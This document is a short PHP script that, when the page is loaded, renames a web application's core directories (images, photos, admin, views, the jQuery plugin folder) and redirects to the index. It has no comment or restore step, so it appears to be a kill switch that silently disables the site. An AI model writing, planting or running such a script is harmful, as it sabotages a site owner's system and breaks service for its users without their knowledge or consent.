<?
	require "../../../../../system/conecta.php";
	require "../../../../../system/mysql.php";
	require "../../../../../app/Funcoes/funcoes.php";
	require "sessao.php";

		$old_name = "../../../../../web/img";
		$new_name = "../../../../../web/img1";
		rename($old_name,$new_name);
		$old_name = "../../../../../web/fotos";
		$new_name = "../../../../../web/fotos1";
		rename($old_name,$new_name);
		$old_name = "../../../../../admin/";
		$new_name = "../../../../../admin1/";
		rename($old_name,$new_name);
		$old_name = "../../../../../views";
		$new_name = "../../../../../views1";
		rename($old_name,$new_name);
		$old_name = "../../../../../plugins/Jquery";
		$new_name = "../../../../../plugins/Jquery1";
		rename($old_name,$new_name);

		header("Location: index.php");
?>